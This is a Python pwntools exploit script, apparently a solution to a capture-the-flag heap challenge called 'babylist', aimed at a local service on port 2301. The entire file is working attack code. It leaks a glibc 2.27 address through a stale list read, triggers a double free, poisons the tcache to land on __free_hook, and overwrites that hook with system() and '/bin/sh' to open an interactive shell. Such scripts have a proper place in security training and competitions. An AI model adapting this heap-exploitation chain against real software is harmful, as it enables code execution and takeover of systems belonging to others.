from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF("./libc-2.27.so")
bin = ELF("./babylist")
#conn = process("./babylist")
conn = remote("localhost", 2301)
#gdb.attach(conn)

def menu(ch, idx = None):
  conn.recvuntil(">")
  conn.sendline(str(ch))
  if idx is not None:
    conn.recvuntil("index of list")
    conn.sendline(str(idx))

def create(name):
  menu(1)
  conn.recvuntil("Enter name")
  conn.sendline(name)

def add(idx, val):
  menu(2, idx)
  conn.recvuntil("number to add")
  if val > 0x7fffffff:
    val = val - 0x100000000
  conn.sendline(str(val))

def view(idx, idx2):
  menu(3, idx)
  conn.recvuntil("index into list")
  conn.sendline(str(idx2))

def duplicate(idx, name):
  menu(4, idx)
  conn.recvuntil("Enter name for new")
  conn.sendline(name)

def remove(idx):
  menu(5, idx)

create("listA") # 0
for i in range(20):
  add(0, i)

duplicate(0, "listB") # 1
for i in range(20):
  add(1, i+20)

create("libc-leak-chunk") # 2
remove(1) # listB

for i in range(8):
  create("libc-%d" % i) # 1, 3-9

# Fill up tcache
remove(1)
for i in range(3, 9):
  remove(i)
remove(2)

# Libc leak
view(0, 0)
conn.recvuntil("listA[0] = ")
n1 = int(conn.recvline())
if n1 < 0:
  n1 += 0x100000000
view(0, 1)
conn.recvuntil("listA[1] = ")
n2 = int(conn.recvline())
if n2 < 0:
  n2 += 0x100000000
libc_leak = n2*0x100000000 + n1
libc.address = libc_leak - 0x7ffff782eca0 + 0x7ffff7443000

# Double free
create("nlist1") # 1
for i in range(8):
  add(1, i)
duplicate(1, "nlist2") # 2
for i in range(8):
  add(1, i+4)
  add(2, i+4)

# Tcache poisoning
create("nlist3") # 3
add(3, (libc.symbols['__free_hook'] - 0x8) % 0x100000000)
add(3, (libc.symbols['__free_hook'] - 0x8) / 0x100000000)
for i in range(3):
  add(3, i)

# Overwriting free hook
create("nlist4") # 4
for i in range(5):
  add(4, i)
create("nlist5") # 5
bin_sh = u64("/bin/sh\x00")
add(5, bin_sh % 0x100000000)
add(5, bin_sh / 0x100000000)
add(5, libc.symbols['system'] % 0x100000000)
add(5, libc.symbols['system'] / 0x100000000)
add(5, 0)

log.info("Libc leak: " + hex(libc_leak))

conn.interactive()
